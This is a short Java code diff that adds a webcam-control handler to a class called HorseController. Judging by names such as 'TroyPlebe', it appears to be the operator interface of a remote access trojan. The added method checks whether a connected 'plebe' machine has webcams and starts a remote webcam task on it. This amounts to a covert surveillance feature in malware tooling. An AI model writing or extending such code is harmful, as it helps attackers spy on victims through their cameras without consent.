@@ -382,6 +382,26 @@ public class HorseController {
             log.error("Error getting info from row: ", e);
         }
     }
+
+    public void contextWebcam(TableRow<NetInfoTable> row) {
+        try {
+            TroyPlebe tp = row.getItem().getFather();
+            boolean running = tp.getWebcamTask().getRunning().get();
+            if (!running) {
+
+                List<String> list = (List<String>) tp.getWebcamCount().getReceivedObj();
+                if (list.isEmpty()){
+                    showDialog("No webcams found", "Plebe has no webcams available.", Alert.AlertType.ERROR);
+                    return;
+                }
+
+                tp.getWebcamTask().getRunning().set(true);
+                threadPool.execute(tp.getWebcamTask());
+            }
+        } catch (Exception e) {
+            log.error("Error getting info from row: ", e);
+        }
+    }
 }
 
 
